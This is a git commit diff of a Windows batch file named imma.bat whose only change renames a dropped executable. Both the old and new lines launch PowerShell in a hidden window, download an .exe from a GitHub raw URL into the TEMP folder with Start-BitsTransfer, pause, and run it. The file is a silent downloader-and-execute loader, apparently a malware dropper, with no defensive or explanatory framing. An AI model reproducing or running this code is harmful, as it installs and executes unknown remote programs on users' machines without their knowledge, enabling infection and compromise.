2354e98f1821f7f159e27a04ea3fd9734f961e35
pain133337 <xx31068@gmail.com>
2025-07-05 20:16:27 +0300

    Update imma.bat

--- imma.bat
+++ imma.bat
@@ -1,2 +1,2 @@
 @echo off
-powershell -WindowStyle Hidden -command "Start-BitsTransfer -Source 'https://github.com/pain133337/1/raw/main/imma.exe' -Destination $env:TEMP\ppppp1337.exe; Sleep 3; Start-Process $env:TEMP\ppppp1337.exe"
+powershell -WindowStyle Hidden -command "Start-BitsTransfer -Source 'https://github.com/pain133337/1/raw/main/imma.exe' -Destination $env:TEMP\1337.exe; Sleep 3; Start-Process $env:TEMP\1337.exe"
